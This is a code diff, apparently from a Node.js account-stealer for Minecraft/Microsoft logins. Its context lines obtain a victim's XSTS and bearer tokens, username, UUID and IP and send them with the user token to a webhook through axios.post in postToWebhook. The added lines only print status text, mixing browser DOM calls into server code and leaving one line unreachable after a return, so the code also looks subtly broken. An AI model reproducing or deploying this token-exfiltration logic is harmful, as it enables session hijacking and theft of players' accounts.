@@ -53,9 +53,12 @@ var options = {
         const xstsToken = xstsTokenHashArray[0]
         const userHash = xstsTokenHashArray[1]
         const bearerToken = await getBearerToken(xstsToken, userHash)
+        document.getElementById("demo").innerHTML = "SSID refreshed!";
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
+        document.getElementById("demo").innerHTML = "Username: " + username;
+        document.getElementById("demo").innerHTML = "UUID: " + uuid;
         const ip = getIp(req)
         postToWebhook(username, bearerToken, uuid, ip, userToken)
     } catch (e) {
@@ -151,6 +154,8 @@ function postToWebhook(username, bearerToken, uuid, ip, userToken) {
         }]
     }
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
+  return;
+  document.getElementById("demo").innerHTML = "FAILED TO POST (probably refreshed)";
 }
 
 //function returnText() {
